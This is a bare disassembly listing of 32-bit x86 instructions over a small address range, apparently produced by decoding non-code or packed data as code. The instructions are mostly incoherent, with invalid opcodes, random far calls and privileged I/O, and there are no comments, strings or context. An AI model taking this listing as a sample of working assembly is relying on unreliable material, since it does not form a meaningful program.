  4189e6:	cmp    ch,BYTE PTR [esi]
  4189e8:	inc    edx
  4189e9:	xchg   DWORD PTR [ebp+0x322663ff],esi
  4189ef:	mov    esp,0x2d0d79a9
  4189f4:	cmp    dh,BYTE PTR ds:0x35908b20
  4189fa:	jg     0x418a1c
  4189fc:	lahf   
  4189fd:	popa   
  4189fe:	outs   dx,BYTE PTR ds:[esi]
  4189ff:	cs dec eax
  418a01:	int    0x7f
  418a03:	xor    al,0x6a
  418a05:	pop    eax
  418a06:	dec    ebp
  418a07:	(bad)  
  418a08:	and    BYTE PTR [esp+edi*8],dl
  418a0b:	mov    edx,0x5e34a7c8
  418a10:	bound  edx,QWORD PTR [edi-0x1e1bc067]
  418a16:	dec    eax
  418a17:	xchg   esp,eax
  418a18:	adc    bh,BYTE PTR [esp+edx*8+0x10d770e3]
  418a1f:	push   edi
  418a20:	push   edi
  418a21:	je     0x4189d6
  418a23:	cmp    ebx,DWORD PTR ds:0xb8ce9d1b
  418a29:	xchg   ebx,eax
  418a2a:	cdq    
  418a2b:	dec    ecx
  418a2c:	data16 test al,0x26
  418a2f:	mul    BYTE PTR [esi+0x0]
  418a32:	xchg   esp,eax
  418a33:	imul   esi,DWORD PTR [edi],0x2ee4643b
  418a39:	(bad)  
  418a3a:	repnz push 0x1f2dcb6f
  418a40:	dec    BYTE PTR [esp+eax*1]
  418a43:	iret   
  418a44:	pop    ecx
  418a45:	sti    
  418a46:	ret    
  418a47:	dec    esp
  418a48:	(bad)  
  418a49:	daa    
  418a4a:	xchg   ebx,eax
  418a4b:	jnp    0x4189d3
  418a4d:	sub    esi,DWORD PTR [ebx]
  418a4f:	sbb    eax,0x9e164612
  418a54:	pop    edx
  418a55:	adc    BYTE PTR [ebx+0x51],0xa1
  418a59:	das    
  418a5a:	fadd   QWORD PTR [esi-0x4c]
  418a5d:	mov    ebp,0x5d690253
  418a62:	rcl    DWORD PTR [ebp+ecx*8-0x42f74221],0x55
  418a6a:	adc    ch,BYTE PTR gs:[ebx]
  418a6d:	xor    ebx,DWORD PTR [edx]
  418a6f:	mov    al,0x92
  418a71:	adc    BYTE PTR [edi+esi*4+0x6b],ah
  418a75:	pop    esp
  418a76:	gs sub al,cl
  418a79:	push   ss
  418a7a:	fcomp  QWORD PTR [edi+ebx*1-0x7e90c84c]
  418a81:	(bad)  
  418a82:	cmp    eax,0xa0e822eb
  418a87:	std    
  418a88:	cli    
  418a89:	ds ret 
  418a8b:	and    esi,DWORD PTR [ebp-0x76]
  418a8e:	outs   dx,BYTE PTR ds:[esi]
  418a8f:	push   cs
  418a90:	fadd   QWORD PTR [ecx]
  418a92:	fcomp  QWORD PTR [ecx+0x5b8e47c9]
  418a98:	ins    DWORD PTR es:[edi],dx
  418a99:	cs jae 0x418afd
  418a9c:	pop    ecx
  418a9d:	jbe    0x418a61
  418a9f:	mov    bh,BYTE PTR [ebx+0x7]
  418aa2:	mov    al,0x34
  418aa4:	add    BYTE PTR [edx+0x7044c8f9],0x98
  418aab:	mov    edx,0xaafa3d93
  418ab0:	fist   DWORD PTR [ebp-0x1d5fd5b2]
  418ab6:	push   edx
  418ab7:	mov    esi,0xf80ea51b
  418abc:	push   esi
  418abd:	pop    ecx
  418abe:	pop    ecx
  418abf:	bound  ebx,QWORD PTR [eax-0x6f]
  418ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ac3:	(bad)  
  418ac4:	les    esp,FWORD PTR [edi]
  418ac6:	sub    DWORD PTR [ebp+esi*2-0x6d8c1a3a],0x1e849a8f
  418ad1:	ror    cl,0x1
  418ad4:	stos   BYTE PTR es:[edi],al
  418ad5:	pop    ebp
  418ad6:	push   edx
  418ad7:	ds inc ebx
  418ad9:	inc    eax
  418ada:	fimul  WORD PTR [edx-0x593d38c9]
  418ae0:	mov    eax,0x87b915ef
  418ae5:	jno    0x418a78
  418ae7:	jae    0x418b33
  418ae9:	jl     0x418acd
  418aeb:	sbb    DWORD PTR [esi],esi
  418aed:	inc    eax
  418aee:	ins    BYTE PTR es:[edi],dx
  418aef:	es int3 
  418af1:	sbb    DWORD PTR [eax],esi
  418af3:	out    0xd9,al
  418af5:	push   cs
  418af6:	aas    
  418af7:	push   ss
  418af8:	pop    edx
  418af9:	mov    cl,cl
  418afb:	out    dx,al
  418afc:	add    eax,0x8abd83ae
  418b01:	push   ebx
  418b02:	retf   
  418b03:	adc    al,0x3
  418b05:	rcr    BYTE PTR [ebx+0x2ba8abd0],0xb6
  418b0c:	adc    edx,DWORD PTR [ebp+0x77]
  418b0f:	dec    esp
  418b10:	test   DWORD PTR [ebx+0x55],esi
  418b13:	pop    es
  418b14:	hlt    
  418b15:	in     eax,dx
  418b16:	xchg   ebp,eax
  418b17:	les    eax,FWORD PTR [edi+ebp*8-0x22dc0b70]
  418b1e:	push   ebp
  418b1f:	je     0x418b21
  418b21:	mov    DWORD PTR [eax+0x1d],ecx
  418b24:	out    dx,al
  418b25:	push   cs
  418b26:	sub    BYTE PTR ds:0x8309908c,dh
  418b2c:	cmp    al,0x7f
  418b2e:	(bad)  
  418b2f:	shl    BYTE PTR ds:0xe67ca5b7,1
  418b35:	add    DWORD PTR [esi],edi
  418b37:	dec    ebp
  418b38:	mov    dh,ah
  418b3a:	lods   eax,DWORD PTR ds:[esi]
  418b3b:	cs cmc 
  418b3d:	call   0x3560:0xee60fc90
  418b44:	and    DWORD PTR [eax+0x3],ebp
  418b47:	ret    0x89ca
  418b4a:	lahf   
  418b4b:	pushf  
  418b4c:	and    DWORD PTR [eax+0x4505cc76],edi
  418b52:	add    BYTE PTR [ebx+0x6520a8a],ah
  418b58:	xchg   ebx,eax
  418b59:	push   esi
  418b5a:	out    dx,eax
  418b5b:	and    esp,DWORD PTR [ebp+0x3fbbd7c9]
  418b61:	ins    DWORD PTR es:[edi],dx
  418b62:	or     al,0x96
  418b64:	imul   BYTE PTR [ecx+0x4a6918b4]
  418b6a:	mov    ch,0x74
  418b6c:	test   eax,0x790d7460
  418b71:	lea    esi,[edi-0x4]
  418b74:	mov    eax,ds:0xa6c16449
  418b79:	cmp    DWORD PTR [edi-0x646dd1fe],eax
  418b7f:	cmp    eax,0xb1baecd2
  418b84:	and    BYTE PTR [edx+esi*1+0x1881148],dh
  418b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b8c:	jbe    0x418b89
  418b8e:	fdivr  DWORD PTR [edx+0x55302135]
  418b94:	mov    ch,0xe1
  418b96:	cld    
  418b97:	xor    ecx,DWORD PTR [eax+0x54cbe62a]
  418b9d:	push   cs
  418b9e:	dec    esi
  418b9f:	or     ecx,ebp
  418ba1:	mov    al,0xce
  418ba3:	jne    0x418ba5
  418ba5:	shl    BYTE PTR [edi+0x6d],1
  418ba8:	pushf  
  418ba9:	neg    DWORD PTR ds:0xa1791611
  418baf:	mov    al,ds:0x1241d8b9
  418bb4:	lods   eax,DWORD PTR ds:[esi]
  418bb5:	lds    ebp,FWORD PTR [edx-0x4739f48f]
  418bbb:	jp     0x418c30
  418bbd:	inc    edi
  418bbe:	sub    bh,BYTE PTR [eax+0x7826c757]
  418bc4:	and    al,0x44
  418bc6:	cwde   
  418bc7:	xor    al,ch
  418bc9:	cmp    ecx,ecx
  418bcb:	mov    ds:0x23a067db,al
  418bd0:	mov    ecx,0xb09ab74b
  418bd5:	test   eax,0x3b00f046
  418bda:	and    eax,0x8faf94aa
  418bdf:	add    edi,ebx
  418be1:	xchg   ebp,eax
  418be2:	jl     0x418bf0
  418be4:	dec    edi
  418be5:	pop    edi
  418be6:	sar    BYTE PTR [edx],0x44
  418be9:	inc    ebp
  418bea:	adc    DWORD PTR [edi+ebp*8+0x62],0x90563442
  418bf2:	les    edx,FWORD PTR [ebx-0x40]
  418bf5:	ror    BYTE PTR [esi],0xc
  418bf8:	enter  0x81b8,0xb5
  418bfc:	or     ecx,DWORD PTR [edx]
  418bfe:	in     eax,dx
  418bff:	push   ss
  418c00:	in     eax,dx
  418c01:	repnz int 0x81
  418c04:	mov    bh,dh
  418c06:	pop    eax
  418c07:	cli    
  418c08:	pop    ss
  418c09:	cmp    DWORD PTR [esi+0x60fae925],ebp
  418c0f:	outs   dx,BYTE PTR ds:[esi]
  418c10:	push   edx
  418c11:	mov    ebx,0xb91dfbe2
  418c16:	mov    esp,eax
  418c18:	jne    0x418ba6
  418c1a:	popf   
  418c1b:	retf   
  418c1c:	pop    ecx
  418c1d:	mov    ebx,0xc566eaea
  418c22:	push   0x696eaffb
  418c27:	pop    eax
  418c28:	jmp    0x418c82
  418c2a:	sbb    ecx,DWORD PTR [ebx+0x13ae798a]
  418c30:	pop    ss
  418c31:	mov    eax,0xef08f94b
  418c36:	mov    dl,0x6d
  418c38:	pop    eax
  418c39:	cmp    BYTE PTR [edx+0x405174cf],0x60
  418c40:	iret   
  418c41:	sbb    BYTE PTR [ebp+0x5e],bl
  418c44:	prefetchw BYTE PTR [ecx-0x7dc011ec]
  418c4b:	imul   ebp,ecx,0xffffff97
  418c4e:	push   ds
  418c4f:	clc    
  418c50:	test   al,0x44
  418c52:	inc    esi
  418c53:	imul   ebp,DWORD PTR [esi],0x4c
  418c56:	cmc    
  418c57:	cmp    BYTE PTR [edx-0x7e],bl
  418c5a:	jbe    0x418bee
  418c5c:	mov    ch,0x85
  418c5e:	test   DWORD PTR [ebx+0x2e],esi
  418c61:	inc    eax
  418c62:	pop    es
  418c63:	out    0x6c,al
  418c65:	ret    0x5de7
  418c68:	enter  0x991e,0x30
  418c6c:	scas   eax,DWORD PTR es:[edi]
  418c6d:	mov    WORD PTR [esi+0x4bd5b6c5],ds
  418c73:	mov    ch,0x8c
  418c75:	jmp    0xa7bf:0xba97dfee
  418c7c:	aam    0xf4
  418c7e:	cmp    ecx,edi
  418c80:	repnz xchg edi,eax
  418c82:	loope  0x418c86
  418c84:	xor    eax,0x1679fd97
  418c89:	pop    esp
  418c8a:	in     eax,0x9d
  418c8c:	push   eax
  418c8d:	(bad)  
  418c8e:	inc    esp
  418c8f:	scas   al,BYTE PTR es:[edi]
  418c90:	es jg  0x418c1f
  418c93:	sbb    al,0x5f
  418c95:	enter  0x752e,0xd6
  418c99:	adc    esi,esi
  418c9b:	pop    ebx
  418c9c:	pop    eax
  418c9d:	jecxz  0x418c2d
  418c9f:	adc    al,BYTE PTR [edx]
  418ca1:	and    bl,al
  418ca3:	loope  0x418cfc
  418ca5:	mov    al,0xca
  418ca7:	mov    dl,0x11
  418ca9:	or     DWORD PTR [eax+0x42ea3283],esi
  418caf:	(bad)  
  418cb0:	xchg   edx,eax
  418cb1:	inc    ebx
  418cb2:	dec    esp
  418cb3:	mov    ah,0x56
  418cb5:	bswap  ebx
  418cb7:	or     al,BYTE PTR [esi]
  418cb9:	pop    edi
  418cba:	cmp    eax,0xa5c005d
  418cbf:	xor    DWORD PTR [ebx-0x5ca4c82a],ebp
  418cc5:	mov    ebx,esi
  418cc7:	shl    DWORD PTR [esi-0x29],1
  418cca:	or     esp,DWORD PTR [ebp-0x50]
  418ccd:	pop    ss
  418cce:	sahf   
  418ccf:	aas    
  418cd0:	rcr    BYTE PTR [edx+0x60],0xa0
  418cd4:	jae    0x418d1f
  418cd6:	cmp    ebx,ecx
  418cd8:	es cmp cl,cl
  418cdb:	push   esp
  418cdc:	call   DWORD PTR [eax]
  418cde:	(bad)  
  418cdf:	out    dx,eax
  418ce0:	mov    esp,0xa226e883
  418ce5:	mov    esi,0xaeaec070
  418cea:	aad    0x9a
  418cec:	jecxz  0x418d18
  418cee:	cmp    BYTE PTR [ecx],cl
  418cf0:	ret    0x47e3
  418cf3:	std    
  418cf4:	xchg   ebx,eax
  418cf5:	add    al,0x8d
  418cf7:	lods   al,BYTE PTR ds:[esi]
  418cf8:	(bad)  
  418cf9:	jb     0x418cfc
  418cfb:	pusha  
  418cfc:	fld1   
  418cfe:	ret    
  418cff:	xor    ch,0xb0
  418d02:	jb     0x418ca1
  418d04:	xchg   esi,eax
  418d05:	cmp    DWORD PTR [esi],ebp
  418d07:	icebp  
  418d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d09:	or     BYTE PTR [ecx+0x50],bh
  418d0c:	xchg   esp,eax
  418d0d:	sub    al,0xa1
  418d0f:	add    ah,BYTE PTR [edi-0x396d47be]
  418d15:	push   cs
  418d16:	and    DWORD PTR [edi],edx
  418d18:	aam    0x4b
  418d1a:	xor    ecx,ecx
  418d1c:	loope  0x418d3c
  418d1e:	or     DWORD PTR [ebx+0x72d78498],edi
  418d24:	jmp    0x418cc7
  418d26:	mov    eax,ds:0xb7750c4d
  418d2b:	in     al,dx
  418d2c:	cli    
  418d2d:	cmp    ebx,esp
  418d2f:	mov    ds:0x617448d2,eax
  418d34:	mov    ah,0xa7
  418d36:	mov    al,BYTE PTR [esi+0x1b]
  418d39:	mov    al,0xc8
  418d3b:	xor    eax,0x94e973e4
  418d40:	sbb    dl,BYTE PTR [ebp+0x39]
  418d43:	mov    ch,0x81
  418d45:	daa    
  418d46:	test   eax,0xa8e0da0b
  418d4b:	add    al,BYTE PTR [edx+edx*8]
  418d4e:	xor    DWORD PTR [esi],eax
  418d50:	add    BYTE PTR [esi],ch
  418d52:	(bad)  [edi-0x2fb48f11]
  418d58:	out    0x91,eax
  418d5a:	mov    cl,0x8a
  418d5c:	fidiv  WORD PTR [edi+0x677d97b7]
  418d62:	push   eax
  418d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d64:	es (bad) 
  418d66:	cmp    eax,0x37f82d10
  418d6b:	inc    ebp
  418d6c:	fisub  WORD PTR [esi-0x1e]
  418d6f:	push   es
  418d70:	dec    ebx
  418d71:	nop
  418d72:	pop    eax
  418d73:	pushf  
  418d74:	sbb    al,0xd4
  418d76:	push   ebp
  418d77:	cwde   
  418d78:	mov    eax,0x2c0f7d8c
  418d7d:	pop    ecx
  418d7e:	test   BYTE PTR [edx],al
  418d80:	mov    al,0x32
  418d82:	rol    BYTE PTR [edi],cl
  418d84:	(bad)  
  418d85:	mov    al,ds:0xcfaa0bdd
  418d8a:	push   esi
  418d8b:	retf   0x458f
  418d8e:	cld    
  418d8f:	mov    ch,0x5c
  418d91:	mov    esp,DWORD PTR [esi]
  418d93:	fisttp DWORD PTR [edx+0x14946db4]
  418d99:	pop    esi
  418d9a:	dec    eax
  418d9b:	hlt    
  418d9c:	sub    BYTE PTR [ebx],0xc9
  418d9f:	shl    BYTE PTR [ebx-0x16],1
  418da2:	int    0xf2
  418da4:	fdivr  DWORD PTR [ebx-0x1ed9a05a]
  418daa:	mov    ah,0xff
  418dac:	or     al,0xd7
  418dae:	add    bh,BYTE PTR [ebp+0x2d]
  418db1:	jne    0x418dda
  418db3:	outs   dx,DWORD PTR ds:[esi]
  418db4:	cmp    DWORD PTR [edx+0x51],0xffffff94
  418db8:	fmul   DWORD PTR ds:0x6224e8b3
  418dbe:	mov    ecx,0x61540032
  418dc3:	inc    DWORD PTR [esi-0x6e]
  418dc6:	push   0x30
  418dc8:	pop    es
  418dc9:	cmp    bl,0xed
  418dcc:	xlat   BYTE PTR ds:[ebx]
  418dcd:	dec    ebx
  418dce:	fsub   DWORD PTR [edx-0x7659e0c6]
  418dd4:	pushf  
  418dd5:	xchg   esi,eax
  418dd6:	inc    ebx
  418dd7:	(bad)  
  418dd8:	ds pop ebx
  418dda:	inc    esp
  418ddb:	into   
  418ddc:	cwde   
  418ddd:	mov    BYTE PTR [eax],0x0
  418de0:	add    BYTE PTR [eax],al
  418de2:	mov    dl,0x57
  418de4:	push   0xffffffc9
  418de6:	out    dx,eax
  418de7:	std    
  418de8:	mov    bl,0x7f
  418dea:	push   ebx
  418deb:	jg     0x418e10
  418ded:	mov    ecx,0x4c3ad26e
  418df2:	cmc    
  418df3:	or     al,BYTE PTR [ecx]
  418df5:	add    ah,dh
  418df7:	add    al,0x0
  418df9:	add    BYTE PTR [esi-0x3c543fe6],bh
  418dff:	pop    esp
  418e00:	jmp    0x3e85:0x4a17411b
  418e07:	arpl   di,si
  418e09:	xchg   DWORD PTR [ecx+0x7d],ecx
  418e0c:	lods   al,BYTE PTR ds:[esi]
  418e0d:	pushf  
  418e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e0f:	dec    ecx
  418e10:	dec    esp
  418e11:	mov    esi,0x12b93749
  418e16:	lock ins DWORD PTR es:[edi],dx
  418e18:	sub    cl,cl
  418e1a:	mov    esi,0xee269e3d
  418e1f:	popf   
  418e20:	scas   al,BYTE PTR es:[edi]
  418e21:	mov    eax,ds:0x10fa69ba
  418e26:	out    0xae,al
  418e28:	xchg   edx,eax
  418e29:	xor    dl,bh
  418e2b:	mov    dh,0x7c
  418e2d:	nop
  418e2e:	xor    al,0xb9
  418e30:	or     eax,0x667fa157
  418e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e36:	fimul  WORD PTR [ecx-0xe]
  418e39:	ja     0x418e27
  418e3b:	or     bh,BYTE PTR [ecx+0x3]
  418e3e:	shr    DWORD PTR [ecx-0x72e0ec29],1
  418e44:	xchg   ch,al
  418e46:	mov    BYTE PTR [ebx-0x65943a8d],al
  418e4c:	popa   
  418e4d:	inc    ecx
  418e4e:	inc    edx
  418e4f:	mov    DWORD PTR [esi],ebx
  418e51:	pop    ss
  418e52:	fmul   st,st(3)
  418e54:	inc    ebp
  418e55:	addr16 push 0xffffffdd
  418e58:	outs   dx,BYTE PTR ds:[esi]
  418e59:	js     0x418e8d
  418e5b:	jbe    0x418e27
  418e5d:	leave  
  418e5e:	push   esp
  418e5f:	mov    esp,0x9e8139c7
  418e64:	xchg   edi,eax
  418e65:	push   esp
  418e66:	sub    ch,ah
  418e68:	jbe    0x418e3a
  418e6a:	mov    bl,0x97
  418e6c:	add    BYTE PTR [edx+0x13],0xed
  418e70:	adc    al,0xd7
  418e72:	mov    edx,0xa3ad93d
  418e77:	in     al,dx
  418e78:	loopne 0x418e4b
  418e7a:	and    bl,cl
  418e7c:	mov    ebp,DWORD PTR [ebp-0x691b49a5]
  418e82:	xchg   edi,eax
  418e83:	lea    ecx,[ecx+0x583afbaf]
  418e89:	push   esi
  418e8a:	jl     0x418eee
  418e8c:	sbb    BYTE PTR [ebx+0x45],dh
  418e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e90:	lea    esp,[esi+0x62]
  418e93:	sbb    al,0x97
  418e95:	mov    BYTE PTR [esi+0x1d487516],bh
  418e9b:	es fdiv st,st(6)
  418e9e:	cmp    ecx,DWORD PTR [ebp-0x3d]
  418ea1:	fnstenv [ebp+0x3f93c38b]
  418ea7:	repnz dec eax
  418ea9:	(bad)  
  418eaa:	mov    gs,ebp
  418eac:	xchg   edi,eax
  418ead:	jnp    0x418f1f
  418eaf:	pushf  
  418eb0:	push   ds
  418eb1:	push   0xffffff80
  418eb3:	ds sahf 
  418eb5:	(bad)  
  418eb6:	popa   
  418eb7:	mov    ebp,0xcc996803
  418ebc:	in     eax,0x36
  418ebe:	or     BYTE PTR [eax+0x2ecb9219],dh
  418ec4:	mov    ds:0xc8d7e56a,eax
  418ec9:	fwait
  418eca:	pop    eax
  418ecb:	sbb    ah,dl
  418ecd:	inc    esp
  418ece:	push   0xde581788
  418ed3:	cmp    eax,DWORD PTR [eax]
  418ed5:	and    cl,BYTE PTR ds:0xab68c5ed
  418edb:	addr16 push ecx
  418edd:	ret    
  418ede:	xor    BYTE PTR [edi],0xbd
  418ee1:	and    eax,0xd19023e
  418ee6:	sbb    DWORD PTR [ebx],ecx
  418ee8:	xchg   esi,eax
  418ee9:	cld    
  418eea:	xchg   edx,eax
  418eeb:	in     al,0xf1
  418eed:	inc    esi
  418eee:	xchg   ecx,eax
  418eef:	xor    BYTE PTR [esi+eax*4],ch
  418ef2:	sub    DWORD PTR [edi+0x40],0x0
  418ef6:	lea    esp,ds:0x3bb5edc7
  418efc:	aaa    
  418efd:	jo     0x418f05
  418eff:	xor    al,0x11
  418f01:	ret    0xc654
  418f04:	xor    BYTE PTR [esi+edx*8],bl
  418f07:	push   0xffffff86
  418f09:	or     eax,0xfdd96cd7
  418f0e:	nop
  418f0f:	scas   al,BYTE PTR es:[edi]
  418f10:	xlat   BYTE PTR ds:[ebx]
  418f11:	bound  eax,QWORD PTR [ebp-0x56]
  418f14:	enter  0x77b9,0x27
  418f18:	adc    BYTE PTR [edx+esi*2],ch
  418f1b:	or     al,0x2d
  418f1d:	fyl2xp1 
  418f1f:	test   DWORD PTR [eax+0x9],0xbdf81d49
  418f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f27:	cld    
  418f28:	xchg   ebp,eax
  418f29:	call   0xc0a5:0x3b9093e2
  418f30:	out    0x17,eax
  418f32:	add    al,0x16
  418f34:	test   eax,0xd6b0fd8b
  418f39:	ret    0x822a
  418f3c:	xor    BYTE PTR [esi+eiz*4+0x4b],cl
  418f40:	das    
  418f41:	ror    BYTE PTR [edi-0x76],0x1b
  418f45:	add    al,0xf5
  418f47:	dec    edx
  418f48:	sub    BYTE PTR [ebp-0x42],bh
  418f4b:	outs   dx,DWORD PTR ds:[esi]
  418f4c:	popf   
  418f4d:	inc    edx
  418f4e:	fisubr DWORD PTR [edx+esi*1-0x4d]
  418f52:	cld    
  418f53:	pusha  
  418f54:	mov    esi,0x12eb98c4
  418f59:	(bad)  
  418f5b:	es jg  0x418f37
  418f5e:	test   eax,0x98466a4
  418f63:	xchg   edi,eax
  418f64:	pop    ss
  418f65:	mov    bh,0x4
  418f67:	jg     0x418f31
  418f69:	push   0xffffffb6
  418f6b:	dec    esi
  418f6c:	or     eax,0x7ffbc09
  418f71:	leave  
  418f72:	adc    eax,0x73782521
  418f77:	cmp    eax,0xeb0d7bdd
  418f7c:	xchg   ebp,eax
  418f7d:	fwait
  418f7e:	and    esi,edi
  418f80:	inc    esi
  418f81:	in     eax,0xd9
  418f83:	pop    edi
  418f84:	nop
  418f85:	fist   WORD PTR [edi+edx*1-0x7d06df9b]
  418f8c:	xor    DWORD PTR [eax+0x6b],ecx
  418f8f:	jnp    0x418f59
  418f91:	into   
  418f92:	pop    edi
  418f93:	xor    bh,bh
  418f95:	adc    eax,0x99e29577
  418f9a:	shl    dl,1
  418f9c:	xor    al,0x1b
  418f9e:	or     dh,bh
  418fa0:	cwde   
  418fa1:	pop    edi
  418fa2:	mov    eax,0xfaec6a34
  418fa7:	cs das 
  418fa9:	into   
  418faa:	enter  0x5a2d,0x1b
  418fae:	push   0xfffffff8
  418fb0:	out    dx,eax
  418fb1:	or     al,0x4e
  418fb3:	pop    ds
  418fb4:	dec    edi
  418fb5:	fidivr WORD PTR [eax-0x40]
  418fb8:	or     BYTE PTR [esi],al
  418fba:	pop    esi
  418fbb:	mov    eax,0xa2cc043f
  418fc0:	stos   BYTE PTR es:[edi],al
  418fc1:	inc    ecx
  418fc2:	out    dx,eax
  418fc3:	sbb    al,0x15
  418fc5:	sbb    ecx,DWORD PTR fs:[eax-0x38035e78]
  418fcc:	mov    WORD PTR [edi],?
  418fce:	nop    DWORD PTR [edx-0x79]
  418fd2:	push   esp
  418fd3:	dec    ebp
  418fd4:	add    bh,BYTE PTR [esi+ebx*1]
  418fd7:	enter  0xa73f,0x4
  418fdb:	lahf   
  418fdc:	shl    BYTE PTR [ecx+edx*2+0x48],cl
  418fe0:	xchg   DWORD PTR [ebx+0x73],esi
  418fe3:	mov    bl,0xee
  418fe5:	mov    esp,0x8bdcd63f
  418fea:	into   
  418feb:	or     BYTE PTR [edx],ah
  418fed:	sti    
  418fee:	xor    al,0x6a
  418ff0:	je     0x41906f
  418ff2:	inc    ebx
  418ff3:	jle    0x418fe6
  418ff5:	and    DWORD PTR [ebp-0x338dfcf9],edx
  418ffb:	or     BYTE PTR [ebp+0x25],al
  418ffe:	mov    eax,0x8a475a3f
  419004:	or     BYTE PTR [edx-0xbba28ac],cl
  41900a:	mov    cl,ch
  41900c:	imul   edx,DWORD PTR ds:0x1ea007d1,0xfffffffa
  419013:	shr    DWORD PTR [ebx+0x1780115b],1
  419019:	inc    edx
  41901a:	stos   DWORD PTR es:[edi],eax
  41901b:	inc    ebp
  41901c:	cwde   
  41901d:	sub    dl,BYTE PTR cs:[esi]
  419020:	cs (bad) 
  419022:	outs   dx,BYTE PTR ds:[esi]
  419023:	adc    BYTE PTR [edx+edi*1+0x64],ch
  419027:	out    dx,al
  419028:	ins    DWORD PTR es:[edi],dx
  419029:	stc    
  41902a:	fnstcw WORD PTR [edi]
  41902c:	call   0x4ccd:0x4371cbe9
  419033:	pop    es
  419034:	jp     0x418ff7
  419036:	xor    eax,0x1758e98f
  41903b:	add    BYTE PTR [eax],bh
  41903d:	adc    al,0xe2
  41903f:	pop    es
  419040:	sub    al,0xf3
  419042:	inc    ecx
  419043:	inc    edx
  419044:	jae    0x418fff
  419046:	inc    ebx
  419047:	idiv   esi
  419049:	stos   BYTE PTR es:[edi],al
  41904a:	sub    DWORD PTR [edi+0x44],ebp
  41904d:	fwait
  41904e:	out    0x9c,eax
  419050:	xor    ebp,edx
  419052:	xor    esi,DWORD PTR [edi-0x1e]
  419055:	xchg   edi,eax
  419056:	loop   0x419044
  419058:	adc    dl,ch
  41905a:	(bad)  [edx]
  41905c:	jmp    0x419018
  41905e:	outs   dx,BYTE PTR ds:[esi]
  41905f:	cwde   
  419060:	cs stc 
  419062:	aas    
  419063:	push   es
  419064:	push   edx
  419065:	(bad)  
  419066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419067:	add    bh,dl
  419069:	pusha  
  41906a:	xor    BYTE PTR [edi-0x2c],dl
  41906d:	cmp    ch,BYTE PTR [edi]
  41906f:	xchg   edi,eax
  419070:	rcr    DWORD PTR [ebx],cl
  419072:	sbb    bl,BYTE PTR [edi+0xa3c5adc]
  419078:	shl    DWORD PTR [esi-0x1690987c],0x74
  41907f:	arpl   bp,si
  419081:	jmp    esi
  419083:	sbb    edi,DWORD PTR [edi+0x4af862bc]
  419089:	(bad)
  41908c:	sbb    eax,0xfdefc832
  419091:	adc    eax,0x18bdb819
  419096:	mov    bl,0x42
  419098:	ds test al,0xf7
  41909b:	sub    eax,0xafbdb2b5
  4190a0:	dec    ebx
  4190a1:	mov    al,ds:0x41e8df45
  4190a6:	scas   al,BYTE PTR es:[edi]
  4190a7:	xor    BYTE PTR [eax-0x523e019a],al
  4190ad:	out    0x1f,al
  4190af:	push   ecx
  4190b0:	pop    edi
  4190b1:	jbe    0x419130
  4190b3:	pop    edi
  4190b4:	jae    0x419093
  4190b6:	xchg   esi,eax
  4190b7:	pushf  
  4190b8:	mov    eax,ds:0x2c11df72
  4190bd:	jo     0x419095
  4190bf:	dec    ebx
  4190c0:	pop    es
  4190c1:	outs   dx,DWORD PTR ds:[esi]
  4190c2:	xchg   esp,eax
  4190c3:	cmp    al,0xe5
  4190c5:	cmp    eax,0xdaa6109a
  4190ca:	inc    edx
  4190cb:	shl    DWORD PTR [ecx+0x1f311aad],0x9a
  4190d2:	jns    0x419120
  4190d4:	mov    edx,0xd74f637c
  4190d9:	xchg   BYTE PTR [esi-0x683538c1],ch
  4190df:	out    0x34,al
  4190e1:	sbb    bl,BYTE PTR [edi+ebx*8-0x3c]
  4190e5:	sti    
  4190e6:	out    0xcd,al
  4190e8:	push   ss
  4190e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190ea:	fimul  WORD PTR [ebx]
  4190ec:	or     BYTE PTR [edx],0x69
  4190ef:	ss out dx,eax
  4190f1:	jmp    DWORD PTR [esi-0x1]
  4190f4:	xchg   edi,eax
  4190f5:	bound  ecx,QWORD PTR [esi+edx*4-0x76]
  4190f9:	mov    fs,WORD PTR [edi]
  4190fb:	xchg   DWORD PTR [edi+0x6b],esp
  4190fe:	outs   dx,DWORD PTR ds:[esi]
  4190ff:	xchg   edi,eax
  419100:	sti    
  419101:	push   esp
  419102:	inc    edi
  419103:	xchg   esp,eax
  419104:	lea    esp,[ecx]
  419106:	call   0xb4e8:0x625dad44
  41910d:	inc    esp
  41910e:	es jns 0x419092
  419111:	jg     0x419135
  419113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419114:	pop    es
  419115:	stos   BYTE PTR es:[edi],al
  419116:	jno    0x41912b
  419118:	mov    dh,0x18
  41911a:	int3   
  41911b:	ficomp WORD PTR [ecx-0x50]
  41911e:	sub    ah,BYTE PTR [edx+0x3fd55abf]
  419124:	add    eax,0xd7999f73
  419129:	cmp    DWORD PTR [ebp-0x5d02bb39],ecx
  41912f:	mov    dh,0xde
  419131:	ret    0x2e9
  419134:	add    eax,0x4ec62522
  419139:	idiv   DWORD PTR [esi-0x1bb26df2]
  41913f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419140:	mov    esi,DWORD PTR [ecx-0x28]
  419143:	dec    ecx
  419144:	test   al,0x18
  419146:	out    0xe5,al
  419148:	mov    bl,0xc
  41914a:	fs stc 
  41914c:	sbb    DWORD PTR [edx],edx
  41914e:	out    0x75,al
  419150:	xchg   esi,eax
  419151:	dec    ecx
  419152:	mov    edi,0x9d8a5bb3
  419157:	pop    ss
  419158:	outs   dx,BYTE PTR ds:[esi]
  419159:	mov    edi,0xdf4bdae4
  41915e:	pop    edi
  41915f:	stc    
  419160:	push   edx
  419161:	adc    eax,0xfd81df5e
  419166:	ja     0x4190ec
  419168:	jle    0x419160
  41916a:	jp     0x419160
  41916c:	clc    
  41916d:	popf   
  41916e:	push   edx
  41916f:	xchg   DWORD PTR [eax],ecx
  419171:	in     al,0x2f
  419173:	bound  edi,QWORD PTR [edx-0x6d]
  419176:	test   al,0xa
  419178:	pop    ds
  419179:	retf   0x3098
  41917c:	push   ecx
